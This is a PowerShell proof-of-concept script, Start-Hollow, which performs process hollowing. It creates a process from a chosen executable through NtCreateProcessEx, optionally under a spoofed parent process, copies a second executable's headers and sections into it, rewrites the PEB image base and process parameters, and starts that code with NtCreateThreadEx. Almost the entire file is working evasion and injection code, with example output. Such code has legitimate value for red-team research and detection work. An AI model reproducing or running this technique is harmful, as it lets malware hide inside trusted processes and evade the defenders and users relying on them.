function Start-Hollow {
<#
.SYNOPSIS
	This is a proof-of-concept for process hollowing. There is nothing new here except
	maybe the use of NtCreateProcessEx which has some advantages in that it offers a
	convenient way to set a parent process and avoids the bothersome Get/SetThreadContext.
	On the flipside CreateRemoteThreadEx/NtCreateThreadEx are pretty suspicious API's.

	I wrote this POC mostly to educate myself on the mechanics of hollowing. It is possible
	to load the Hollow from an internal byte array straight into memory but I have not
	implemented this functionality.
	
	Notes:
		- I tested this POC on x32 Win7 and x64 Win10 RS4.
		- You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER Sponsor
	The sponsor PE, this is the executable that will host the binary.

.PARAMETER Hollow
	The PE that will run inside the sponsor.

.PARAMETER ParentPID
	Optionally specify a PID for the parent process of the hollow. This requires the
	appropriate access rights to the process. If unspecified, PowerShell will be the parent.

.EXAMPLE
	# Create a Hollow from a PE on disk with explorer as the parent.
	# x64 Win10 RS4
	C:\PS> Start-Hollow -Sponsor C:\Windows\System32\notepad.exe -Hollow C:\Some\PE.exe -ParentPID 8304 -Verbose
	VERBOSE: [?] A place where souls may mend your ailing mind..
	VERBOSE: [+] Opened file for access
	VERBOSE: [+] Created section from file handle
	VERBOSE: [+] Opened handle to the parent => explorer
	VERBOSE: [+] Created process from section
	VERBOSE: [+] Acquired PBI
	VERBOSE: [+] Sponsor architecture is x64
	VERBOSE: [+] Sponsor ImageBaseAddress => 7FF69E9F0000
	VERBOSE: [+] Allocated space for the Hollow process
	VERBOSE: [+] Duplicated Hollow PE headers to the Sponsor
	VERBOSE: [+] Duplicated .text section to the Sponsor
	VERBOSE: [+] Duplicated .rdata section to the Sponsor
	VERBOSE: [+] Duplicated .data section to the Sponsor
	VERBOSE: [+] Duplicated .pdata section to the Sponsor
	VERBOSE: [+] Duplicated .rsrc section to the Sponsor
	VERBOSE: [+] Duplicated .reloc section to the Sponsor
	VERBOSE: [+] New process ImageBaseAddress => 40000000
	VERBOSE: [+] Created Hollow process parameters
	VERBOSE: [+] Allocated memory in the Hollow
	VERBOSE: [+] Process parameters duplicated into the Hollow
	VERBOSE: [+] Rewrote Hollow->PEB->pProcessParameters
	VERBOSE: [+] Created Hollow main thread..
	True

#>
	[CmdletBinding()]
	param(
		[Parameter(Mandatory = $True)]
		[String]$Sponsor,
		[Parameter(Mandatory = $True)]
		[String]$Hollow,
		[Parameter(Mandatory = $False)]
		[int]$ParentPID
	)


	# Native API Definitions
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[Flags]
	public enum AllocationProtect : uint
	{
		NONE = 0x00000000,
		PAGE_EXECUTE = 0x00000010,
		PAGE_EXECUTE_READ = 0x00000020,
		PAGE_EXECUTE_READWRITE = 0x00000040,
		PAGE_EXECUTE_WRITECOPY = 0x00000080,
		PAGE_NOACCESS = 0x00000001,
		PAGE_READONLY = 0x00000002,
		PAGE_READWRITE = 0x00000004,
		PAGE_WRITECOPY = 0x00000008,
		PAGE_GUARD = 0x00000100,
		PAGE_NOCACHE = 0x00000200,
		PAGE_WRITECOMBINE = 0x00000400
	}

	[Flags]
	public enum SectionFlags : uint
	{
		TYPE_NO_PAD = 0x00000008,
		CNT_CODE = 0x00000020,
		CNT_INITIALIZED_DATA = 0x00000040,
		CNT_UNINITIALIZED_DATA = 0x00000080,
		LNK_INFO = 0x00000200,
		LNK_REMOVE = 0x00000800,
		LNK_COMDAT = 0x00001000,
		NO_DEFER_SPEC_EXC = 0x00004000,
		GPREL = 0x00008000,
		MEM_FARDATA = 0x00008000,
		MEM_PURGEABLE = 0x00020000,
		MEM_16BIT = 0x00020000,
		MEM_LOCKED = 0x00040000,
		MEM_PRELOAD = 0x00080000,
		ALIGN_1BYTES = 0x00100000,
		ALIGN_2BYTES = 0x00200000,
		ALIGN_4BYTES = 0x00300000,
		ALIGN_8BYTES = 0x00400000,
		ALIGN_16BYTES = 0x00500000,
		ALIGN_32BYTES = 0x00600000,
		ALIGN_64BYTES = 0x00700000,
		ALIGN_128BYTES = 0x00800000,
		ALIGN_256BYTES = 0x00900000,
		ALIGN_512BYTES = 0x00A00000,
		ALIGN_1024BYTES = 0x00B00000,
		ALIGN_2048BYTES = 0x00C00000,
		ALIGN_4096BYTES = 0x00D00000,
		ALIGN_8192BYTES = 0x00E00000,
		ALIGN_MASK = 0x00F00000,
		LNK_NRELOC_OVFL = 0x01000000,
		MEM_DISCARDABLE = 0x02000000,
		MEM_NOT_CACHED = 0x04000000,
		MEM_NOT_PAGED = 0x08000000,
		MEM_SHARED = 0x10000000,
		MEM_EXECUTE = 0x20000000,
		MEM_READ = 0x40000000,
		MEM_WRITE = 0x80000000
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
		public UInt16 Length;
		public UInt16 MaximumLength;
		public IntPtr Buffer;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct OBJECT_ATTRIBUTES
	{
		public Int32 Length;
		public IntPtr RootDirectory;
		public IntPtr ObjectName;
		public UInt32 Attributes;
		public IntPtr SecurityDescriptor;
		public IntPtr SecurityQualityOfService;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct IO_STATUS_BLOCK
	{
		public IntPtr Status;
		public IntPtr Information;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct LARGE_INTEGER
	{
		public uint LowPart;
		public int HighPart;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_BASIC_INFORMATION
	{
		public IntPtr ExitStatus;
		public IntPtr PebBaseAddress;
		public IntPtr AffinityMask;
		public IntPtr BasePriority;
		public UIntPtr UniqueProcessId;
		public IntPtr InheritedFromUniqueProcessId;
	}

	[StructLayout(LayoutKind.Sequential, Pack=1)]
	public struct IMAGE_SECTION_HEADER
	{
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
		public string Name;
		public UInt32 VirtualSize;
		public UInt32 VirtualAddress;
		public UInt32 SizeOfRawData;
		public UInt32 PointerToRawData;
		public UInt32 PointerToRelocations;
		public UInt32 PointerToLinenumbers;
		public UInt16 NumberOfRelocations;
		public UInt16 NumberOfLinenumbers;
		public SectionFlags Characteristics;
	}
	
	public static class Hollow
	{
		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(
			UInt32 processAccess,
			bool bInheritHandle,
			int processId);

		[DllImport("kernel32.dll")]
		public static extern Boolean WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 nSize,
			ref UInt32 lpNumberOfBytesWritten);

		[DllImport("kernel32.dll")]
		public static extern Boolean ReadProcessMemory( 
			IntPtr hProcess, 
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 dwSize, 
			ref UInt32 lpNumberOfBytesRead);

		[DllImport("kernel32.dll")]
		public static extern IntPtr VirtualAllocEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			uint dwSize,
			int flAllocationType,
			int flProtect);

		[DllImport("kernel32.dll")]
		public static extern bool VirtualProtectEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			UInt32 dwSize,
			AllocationProtect flNewProtect,
			ref UInt32 lpflOldProtect);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtOpenFile(
			ref IntPtr FileHandle,
			UInt32 DesiredAccess,
			ref OBJECT_ATTRIBUTES ObjAttr,
			ref IO_STATUS_BLOCK IoStatusBlock,
			UInt32 ShareAccess,
			UInt32 OpenOptions);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtCreateSection(
			ref IntPtr section,
			UInt32 desiredAccess,
			IntPtr pAttrs,
			ref LARGE_INTEGER pMaxSize,
			uint pageProt,
			uint allocationAttribs,
			IntPtr hFile);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtCreateProcessEx(
			ref IntPtr ProcessHandle,
			UInt32 DesiredAccess,
			IntPtr ObjectAttributes,
			IntPtr hInheritFromProcess,
			uint Flags,
			IntPtr SectionHandle,
			IntPtr DebugPort,
			IntPtr ExceptionPort,
			Byte InJob);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtQueryInformationProcess(
			IntPtr processHandle, 
			UInt32 processInformationClass,
			ref PROCESS_BASIC_INFORMATION processInformation,
			UInt32 processInformationLength,
			ref UInt32 returnLength);

		[DllImport("ntdll.dll")]
		public static extern UInt32 RtlCreateProcessParametersEx(
			ref IntPtr pProcessParameters,
			IntPtr ImagePathName,
			IntPtr DllPath,
			IntPtr CurrentDirectory,
			IntPtr CommandLine,
			IntPtr Environment,
			IntPtr WindowTitle,
			IntPtr DesktopInfo,
			IntPtr ShellInfo,
			IntPtr RuntimeData,
			UInt32 Flags);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtCreateThreadEx(
			ref IntPtr hThread,
			UInt32 DesiredAccess,
			IntPtr ObjectAttributes,
			IntPtr ProcessHandle,
			IntPtr lpStartAddress,
			IntPtr lpParameter,
			bool CreateSuspended,
			UInt32 StackZeroBits,
			UInt32 SizeOfStackCommit,
			UInt32 SizeOfStackReserve,
			IntPtr lpBytesBuffer);
	}
"@

	# Helper Functions
	#--------

	function Invoke-AllTheChecks {
		# Check PowerShell proc architecture
		if ([IntPtr]::Size -eq 4) {
			$PoshIs32 = $true
		} else {
			$PoshIs32 = $false
		}

		# Check machine architecture
		if (${Env:ProgramFiles(x86)}) {
			$OsIs32 = $false
		} else {
			$OsIs32 = $true
		}

		# Check Sponsor and Hollow details
		try {
			$SponsorPath = (Resolve-Path $Sponsor -ErrorAction Stop).Path
			$HollowPath = (Resolve-Path $Hollow -ErrorAction Stop).Path
			$SponsorArch = Get-PEArch -Path $SponsorPath
			$HollowArch = Get-PEArch -Path $HollowPath
		} catch {
			$SponsorPath = $false
			$HollowPath = $false
			$SponsorArch = $false
			$HollowArch = $false
		}

		# If $ParentPID check it exists
		if ($ParentPID) {
			$GetProc = Get-Process -Id $ParentPID -ErrorAction SilentlyContinue
			if ($GetProc) {
				$ProcIsValid = $true
			} else {
				$ProcIsValid = $false
			}
		} else {
			# PowerShell will be the parent
			$ProcIsValid = $true
		}
		
		$HashTable = @{
			PoshIs32 = $PoshIs32
			OsIs32 = $OsIs32
			SponsorPath = $SponsorPath
			HollowPath = $HollowPath
			SponsorArch = $SponsorArch
			HollowArch = $HollowArch
			ProcIsValid = $ProcIsValid
		}
		New-Object PSObject -Property $HashTable
	}

	function Get-PEArch {
		param(
			[String]$Path
		)

		try {
			$BinPath = (Resolve-Path $Path -ErrorAction Stop).Path
			$BinBytes = [System.IO.File]::ReadAllBytes($BinPath)
			[Int16]$PEOffset = '0x{0}' -f (($BinBytes[63..60] | % {$_.ToString('X2')}) -join '')
			$OptOffset = $PEOffset + 24
			[Int16]$PEArch = '0x{0}' -f ((($BinBytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')
		} catch {
			$false
			Return
		}

		# We do a sanity check here but really the user should drink more coffee
		[Int16]$MZ = '0x{0}' -f ((($BinBytes[0..1]) | % {$_.ToString('X2')}) -join '')
		[Int16]$PE = '0x{0}' -f ((($BinBytes[($PEOffset)..($PEOffset+1)]) | % {$_.ToString('X2')}) -join '')
		if ($MZ -ne 0x4D5A -Or $PE -ne 0x5045) {
			$false
			Return
		}

		$PEArch # 0x010b = x32; 0x020b = x64
	}

	function Get-PBI {
		param(
			[IntPtr]$hProcess
		)

		$PROCESS_BASIC_INFORMATION = New-Object PROCESS_BASIC_INFORMATION
		$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
		[UInt32]$RetLen = 0
		$CallResult = [Hollow]::NtQueryInformationProcess($hProcess,0,[ref]$PROCESS_BASIC_INFORMATION,$PROCESS_BASIC_INFORMATION_Size, [ref]$RetLen)
		if ($CallResult -ne 0) {
			$false
		} else {
			$PROCESS_BASIC_INFORMATION
		}
	}

	function Get-HollowPEProperties {
		param(
			[IntPtr]$pHollow,
			[Int16]$PEArch
		)

		# Some proper ghetto PE parsing
		$e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($($pHollow.ToInt64() + 0x3C))
		$ImageFileHeader = $pHollow.ToInt64() + $e_lfanew
		[UInt16]$SectionCount = [System.Runtime.InteropServices.Marshal]::ReadInt16($($ImageFileHeader + 0x6))
		[UInt32]$SizeOfOptionalHeader = [System.Runtime.InteropServices.Marshal]::ReadInt16($($ImageFileHeader + 0x14))
		$OptionalHeader = $ImageFileHeader + 0x18
		$SectionHeadersOffset = $OptionalHeader + $SizeOfOptionalHeader
		[UInt32]$EntryPoint = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x10))
		[UInt32]$BaseOfCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x14))
		if ($PEArch -eq 0x010b) {
			[UInt32]$ImageBase = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x1C))
		} else {
			[UInt64]$ImageBase = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x18))
		}
		[UInt32]$SizeOfImage = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x38))
		[UInt32]$SizeOfHeaders = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x3C))
		
		$HashTable = @{
			SectionCount = $SectionCount
			pSectionHeaders = $SectionHeadersOffset
			EntryPoint = $EntryPoint
			BaseOfCode = $BaseOfCode
			ImageBase = $ImageBase
			SizeOfImage = $SizeOfImage
			SizeOfHeaders = $SizeOfHeaders
		}
		New-Object PSObject -Property $HashTable
	}

	function Set-RemoteMemory {
		param(
			[IntPtr]$hProcess,
			[IntPtr]$pSource,
			[IntPtr]$pDestination,
			$CopySize,
			$ProtectSize,
			$Protect
		)

		[UInt32]$BytesWritten = 0
		$CallResult = [Hollow]::WriteProcessMemory($hProcess,$pDestination,$pSource,$CopySize,[ref]$BytesWritten)
		if (!$CallResult) {
			Write-Verbose "[!] Failed to write section memory"
			$false
			Return
		}

		[UInt32]$OldProtect = 0
		$CallResult = [Hollow]::VirtualProtectEx($hProcess,$pDestination,$ProtectSize,$Protect,[ref]$OldProtect)
		if (!$CallResult) {
			Write-Verbose "[!] Failed to set section memory attributes"
			$false
			Return
		}

		$true
	}

	function Set-RemoteProcessParameters {
		param(
			$hProcess,
			$rPEB
		)

		# Create Unicode process parameter strings
		$uTargetPath = Emit-UNICODE_STRING -Data $Runtime.SponsorPath
		$uDllDir = Emit-UNICODE_STRING -Data "C:\Windows\System32"
		$uCurrentDir = Emit-UNICODE_STRING -Data $(Split-Path $Runtime.SponsorPath -Parent)
		$uWindowName = Emit-UNICODE_STRING -Data "Hollow"

		# Create process parameters struct
		$pProcessParameters = [IntPtr]::Zero
		$CallResult = [Hollow]::RtlCreateProcessParametersEx([ref]$pProcessParameters,$uTargetPath,$uDllDir,$uCurrentDir,$uTargetPath,[IntPtr]::Zero,$uWindowName,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,1)
		if ($CallResult -ne 0) {
			$false
			Write-Verbose "[!] Failed to create process parameters"
			Return
		} else {
			Write-Verbose "[+] Created Hollow process parameters"
		}

		# Copy parameters to the Hollow
		$ProcParamsLength = [System.Runtime.InteropServices.Marshal]::ReadInt32($($pProcessParameters.ToInt64())+4)
		[IntPtr]$HollowProcParams = [Hollow]::VirtualAllocEx($hProcess,$pProcessParameters,$ProcParamsLength,0x3000,0x4)
		if ($HollowProcParams -eq [IntPtr]::Zero) {
			$false
			Write-Verbose "[!] Failed to allocate memory in the Hollow"
			Return
		} else {
			Write-Verbose "[+] Allocated memory in the Hollow"
		}
		$BytesWritten = 0
		$CallResult = [Hollow]::WriteProcessMemory($hProcess,$pProcessParameters,$pProcessParameters,$ProcParamsLength,[ref]$BytesWritten)
		if (!$CallResult) {
			$false
			Write-Verbose "[!] Failed to write process parameters to the Hollow"
			Return
		} else {
			Write-Verbose "[+] Process parameters duplicated into the Hollow"
		}

		# Overwrite PEB
		if ($Runtime.SponsorArch -eq 0x010b) {
			# Sponsor is x32
			[IntPtr]$rProcParamOffset = $rPEB + 0x10
			$WriteSize = 4
			[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WriteSize)
			[System.Runtime.InteropServices.Marshal]::WriteInt32($lpBuffer.ToInt32(),$pProcessParameters.ToInt32())
		} else {
			# Sponsor is x64
			[IntPtr]$rProcParamOffset = $rPEB + 0x20
			$WriteSize = 8
			[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WriteSize)
			[System.Runtime.InteropServices.Marshal]::WriteInt64($lpBuffer.ToInt64(),$pProcessParameters.ToInt64())
		}
		$BytesWritten = 0
		$CallResult = [Hollow]::WriteProcessMemory($hProcess,$rProcParamOffset,$lpBuffer,$WriteSize,[ref]$BytesWritten)
		if (!$CallResult) {
			$false
			Write-Verbose "[!] Failed to rewrite Hollow->PEB->pProcessParameters"
			Return
		} else {
			Write-Verbose "[+] Rewrote Hollow->PEB->pProcessParameters"
		}
	}

	function Emit-UNICODE_STRING {
		param(
			[String]$Data
		)
	
		$UnicodeObject = New-Object UNICODE_STRING
		$UnicodeObject_Buffer = $Data
		[UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
		[UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
		[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
		[IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) # enough for x32/x64
		[system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)
	
		$InMemoryStruct
	}

	# (1) Invoke all the checks -> (╯°□°）╯︵ ┻━┻
	#--------

	$Runtime = Invoke-AllTheChecks

	if ($Runtime.PoshIs32 -eq $true -And $Runtime.OsIs32 -eq $false) {
		Write-Verbose "[!] Cannot perform process hollowing from x32 PowerShell on x64 OS.."
		$false
		Return
	}
	if ($Runtime.SponsorPath -eq $false) {
		Write-Verbose "[!] Failed to validate Sponsor or Hollow parameters.."
		$false
		Return
	}
	if ($Runtime.OsIs32 -eq $false -And $Runtime.SponsorArch -eq 0x010b) {
		Write-Verbose "[!] Cannot create x32 hollowed process on x64 OS.."
		$false
		Return
	}
	if ($Runtime.SponsorArch -ne $Runtime.HollowArch) {
		Write-Verbose "[!] Sponsor and Hollow architectures do not match.."
		$false
		Return
	}
	if ($Runtime.ProcIsValid -eq $false) {
		Write-Verbose "[!] Invalid parent process selected.."
		$false
		Return
	}

	# You know, because passing up a chance to reference Dark Souls would be sacrilege
	Write-Verbose "[?] A place where souls may mend your ailing mind.."

	# (2) Create suspended process
	# -> Emulate modern CreateProcess workflow though NtCreateProcessEx
	#   -> Open, Create Section, Start Process
	# We do a bit of extra legwork here so we can set a parent process and avoid thread context.
	#--------

	[IntPtr]$hFile = [IntPtr]::Zero
	$ObjAttr = New-Object OBJECT_ATTRIBUTES
	$ObjAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($ObjAttr)
	$ObjAttr.ObjectName = Emit-UNICODE_STRING -Data "\??\$($Runtime.SponsorPath)"
	$ObjAttr.Attributes = 0x40 # OBJ_CASE_INSENSITIVE
	$IoStatusBlock = New-Object IO_STATUS_BLOCK
	#--
	# DesiredAccess = FILE_READ_DATA(0x1)|FILE_EXECUTE(0x20)|FILE_READ_ATTRIBUTES(0x80)|SYNCHRONIZE(0x100000) = 0x1000A1
	# ShareAccess = FILE_SHARE_READ(0x1)|FILE_SHARE_DELETE(0x4) = 0x5
	# OpenOptions = FILE_SYNCHRONOUS_IO_NONALERT(0x20)|FILE_NON_DIRECTORY_FILE(0x40) = 0x60
	#--
	$CallResult = [Hollow]::NtOpenFile([ref]$hFile,0x1000A1,[ref]$ObjAttr,[ref]$IoStatusBlock,0x5,0x60)
	if (!$CallResult) {
		Write-Verbose "[+] Opened file for access"
	} else {
		Write-Verbose "[!] NtOpenFile failed.."
		$false
		Return
	}

	# Create section from PE
	$hSection = [IntPtr]::Zero
	$LargeInteger = New-Object LARGE_INTEGER
	$CallResult = [Hollow]::NtCreateSection([ref]$hSection,0xF001F,[IntPtr]::Zero,[ref]$LargeInteger,2,0x1000000,$hFile)
	if (!$CallResult) {
		Write-Verbose "[+] Created section from file handle"
	} else {
		Write-Verbose "[!] NtCreateSection failed.."
		$false
		Return
	}

	# Get handle to the parent PID
	if ($ParentPID) {
		$hParentPID = [Hollow]::OpenProcess(0x1F0FFF,$false,$ParentPID)
		if ($hParentPID -eq [IntPtr]::Zero) {
			Write-Verbose "[!] Unable to open handle to the specified parent => $($(Get-Process -PID $ParentPID).ProcessName)"
			$false
			Return
		} else {
			Write-Verbose "[+] Opened handle to the parent => $($(Get-Process -PID $ParentPID).ProcessName)"
		}
	} else {
		# This is a pseudo handle to self
		$hParentPID = [IntPtr]-1
	}

	# Start process from section
	$hProcess = [IntPtr]::Zero
	$CallResult = [Hollow]::NtCreateProcessEx([ref]$hProcess,0x1FFFFF,[IntPtr]::Zero,$hParentPID,4,$hSection,[IntPtr]::Zero,[IntPtr]::Zero,0)
	if ($hProcess -eq [IntPtr]::Zero) {
		Write-Verbose "[!] NtCreateProcessEx failed.."
		$false
		Return
	} else {
		Write-Verbose "[+] Created process from section"
	}

	# (3) Read data from the suspended process
	# -> Get PEB, Read ImageBase
	#   -> Note: NtCreateProcessEx does not create a main thread on suspend
	#--------

	# Get process basic information
	$ProcessBasicInformation = Get-PBI -hProcess $hProcess
	if (!$ProcessBasicInformation) {
		Write-Verbose "[!] Failed to acquire PBI"
		$false
		Return
	} else {
		Write-Verbose "[+] Acquired PBI"
	}

	# Get ImageBase for suspended process
	$SponsorPEBAddress = $ProcessBasicInformation.PebBaseAddress.ToInt64()
	if ($Runtime.SponsorArch -eq 0x010b) {
		# x32 sponsor
		Write-Verbose "[+] Sponsor architecture is x32"
		[IntPtr]$rImgBaseOffset = $SponsorPEBAddress + 0x8
		$ReadSize = 4
	} else {
		# x64 sponsor
		Write-Verbose "[+] Sponsor architecture is x64"
		[IntPtr]$rImgBaseOffset = $SponsorPEBAddress + 0x10
		$ReadSize = 8
	}

	$BytesRead = 0
	[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ReadSize)
	$CallResult = [Hollow]::ReadProcessMemory($hProcess,$rImgBaseOffset,$lpBuffer,$ReadSize,[ref]$BytesRead)
	if ($CallResult -eq 0) {
		$false
		Write-Verbose "[!] Failed to read Sponsor image base from PEB"
		Return
	} else {
		if ($Runtime.SponsorArch -eq 0x010b) {
			$SponsorImageBase = [System.Runtime.InteropServices.Marshal]::ReadInt32($($lpBuffer.ToInt64()))
		} else {
			$SponsorImageBase = [System.Runtime.InteropServices.Marshal]::ReadInt64($($lpBuffer.ToInt64()))
		}
		Write-Verbose "[+] Sponsor ImageBaseAddress => $('{0:X}' -f $SponsorImageBase)"
	}

	# (4) Map the Hollow into the Sponsor
	# -> Get Hollow properties, Remotely allocate with correct permissions
	#--------

	# Get Hollow properties
	$HollowByteArray = [System.IO.File]::ReadAllBytes($Runtime.HollowPath)
	[IntPtr]$pHollow = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HollowByteArray.Length)
	[System.Runtime.InteropServices.Marshal]::Copy($HollowByteArray, 0, $pHollow, $HollowByteArray.Length)
	$HollowPEProperties = Get-HollowPEProperties -pHollow $pHollow -PEArch $Runtime.HollowArch

	# Enumerate section details
	$SectionArray = @()
	$ImageSectionHeader = (New-Object IMAGE_SECTION_HEADER).GetType()
	for ($i=0; $i -lt $HollowPEProperties.SectionCount; $i++) {
		$pSectionInstance = $HollowPEProperties.pSectionHeaders + $($i*0x28)
		$SectionArray += [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]$pSectionInstance, [type]$ImageSectionHeader)
	}

	# Alloc space for the image (RW)
	# => I think this should be PAGE_EXECUTE_WRITECOPY (0x80) but VP fails to set this
	$pRemoteImageBase = [Hollow]::VirtualAllocEx($hProcess,$(New-Object System.Intptr -ArgumentList $HollowPEProperties.ImageBase),$HollowPEProperties.SizeOfImage,0x3000,0x04)
	if ($pRemoteImageBase -eq [IntPtr]::Zero) {
		$false
		Write-Verbose "[!] Failed to allocate memory in remote process"
		Return
	} else {
		Write-Verbose "[+] Allocated space for the Hollow process"
	}

	# Duplicate PE header
	$flNewProtect = [AllocationProtect]::PAGE_READONLY
	$CallResult = Set-RemoteMemory -hProcess $hProcess -pSource $pHollow -pDestination $pRemoteImageBase -CopySize $HollowPEProperties.SizeOfHeaders -ProtectSize $HollowPEProperties.BaseOfCode -Protect $flNewProtect
	if (!$CallResult) {
		$false
		Write-Verbose "[!] Failed to duplicate Hollow PE headers"
		Return
	} else {
		Write-Verbose "[+] Duplicated Hollow PE headers to the Sponsor"
	}

	# Duplicate sections
	$SectionArray | ForEach-Object {

		# Kind of whack but unsure how to translate properly...
		$ProtectSuccess = $true
		$IsRead = $($_.Characteristics -band [SectionFlags]::MEM_READ)
		$IsWrite = $($_.Characteristics -band [SectionFlags]::MEM_WRITE)
		$IsExecute = $($_.Characteristics -band [SectionFlags]::MEM_EXECUTE)
		if ($IsRead -And !$IsWrite -And !$IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_READONLY
		} elseif ($IsRead -And $IsWrite -And !$IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_READWRITE
		} elseif ($IsRead -And $IsWrite -And $IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_EXECUTE_READWRITE
		} elseif ($IsRead -And !$IsWrite -And $IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_EXECUTE_READ
		} elseif (!$IsRead -And !$IsWrite -And $IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_EXECUTE
		} else {
			$ProtectSuccess = $false
			break
		}

		# Calculate offsets
		$pVirtualSectionBase = [IntPtr]($pRemoteImageBase.ToInt64() + $_.VirtualAddress)
		$pRawSectionBase = [IntPtr]($pHollow.ToInt64() + $_.PointerToRawData)

		# Duplicate
		$CallResult = Set-RemoteMemory -hProcess $hProcess -pSource $pRawSectionBase -pDestination $pVirtualSectionBase -CopySize $_.SizeOfRawData -ProtectSize $_.VirtualSize -Protect $flNewProtect
		if (!$CallResult) {
			$false
			Write-Verbose "[!] Failed to duplicate section: $($_.Name)"
			Return
		} else {
			Write-Verbose "[+] Duplicated $($_.Name) section to the Sponsor"
		}

	}

	if (!$ProtectSuccess) {
		Write-Verbose "[!] We don't know about this section flag: $($_.Characteristics)"
		Return
	}

	# (5) Animate the Hollow
	# -> Rewrite PEB ImageBase, Create process parameters, Start main thread
	#--------

	# Overwrite PEB->ImageBaseAddress
	$NewImageBase = [System.BitConverter]::GetBytes($HollowPEProperties.ImageBase)
	$pNewImageBase = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(8) # enough for x32/x64
	[System.Runtime.InteropServices.Marshal]::Copy($NewImageBase, 0, $pNewImageBase, $NewImageBase.Length)
	[UInt32]$BytesWritten = 0
	$CallResult = [Hollow]::WriteProcessMemory($hProcess,$rImgBaseOffset,$pNewImageBase,$ReadSize,[ref]$BytesWritten)
	if (!$CallResult) {
		$false
		Write-Verbose "[!] Failed to overwrite PEB->ImageBaseAddress"
		Return
	} else {
		Write-Verbose "[+] New process ImageBaseAddress => $('{0:X}' -f $HollowPEProperties.ImageBase)"
	}

	# Create process parameters
	$CallResult = Set-RemoteProcessParameters -hProcess $hProcess -rPEB $SponsorPEBAddress

	# Animate Hollow
	$hRemoteThread = [IntPtr]::Zero
	$lpStartAddress = New-Object System.Intptr -ArgumentList $($HollowPEProperties.ImageBase + $HollowPEProperties.EntryPoint)
	$CallResult = [Hollow]::NtCreateThreadEx([ref]$hRemoteThread,0x1FFFFF,[IntPtr]::Zero,$hProcess,[IntPtr]$lpStartAddress,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)
	if ($CallResult -ne 0) {
		Write-Verbose "[!] NtCreateThreadEx failed.."
		$false
		Return
	} else {
		Write-Verbose "[+] Created Hollow main thread.."
		$true
	}

	# Free $pHollow
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pHollow)
}